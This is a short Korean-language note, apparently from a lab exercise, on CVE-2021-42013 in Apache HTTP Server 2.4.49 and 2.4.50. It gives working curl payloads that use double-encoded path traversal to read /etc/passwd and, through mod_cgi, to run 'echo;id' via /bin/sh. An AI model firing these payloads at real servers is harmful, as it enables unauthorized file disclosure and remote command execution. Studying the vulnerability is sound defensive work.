---

**Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.50 (CVE-2021-42013)**

CVE-2021-42013은 CVE-2021-41773의 불완전한 수정으로 인해 발생한 취약점이다.

Apache는 ../ 문자열을 차단하지만 URL 인코딩을 통해 우회가 가능했다. 

2.4.49 버전에서 해당 취약점을 조치했지만, URL 더블 인코딩으로 또 한번 우회가 가능했다.

이 취약점은 Apache HTTP Server 2.4.49와 2.4.50버전에서 발생하며, 이전 버전에서는 발생하지 않는다.

해당 취약점을 통해 서버 내의 파일들을 읽어 낼 수 있다.

```bash
curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
```

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/1ee8e990-ed1c-4dfe-82b2-0ea562b33f3a/6616524b-ecd7-4c5a-bed4-1a36e7723bee/Untitled.png)

Apache HTTP 서버에서 mod_cgi 모듈을 사용하도록 설정한 경우 원격 코드가 실행될 수 있는 취약점이 추가로 존재한다.

이를 통해 공격자는 HTTP POST 요청을 통해 시스템의 바이너리를 호출할 수 있다.

아래 HTTP POST 요청을 보면 /bin/sh가 echo;id를 실행하는 시스템 바이너리임을 알 수 있으며, 이에 대한 응답으로 id 명령어의 출력을 출력한다.

```bash
curl -v --data "echo;id" 'http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
```

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/1ee8e990-ed1c-4dfe-82b2-0ea562b33f3a/cb3205b0-1614-4a6f-af99-0b2b523e45b1/Untitled.png)
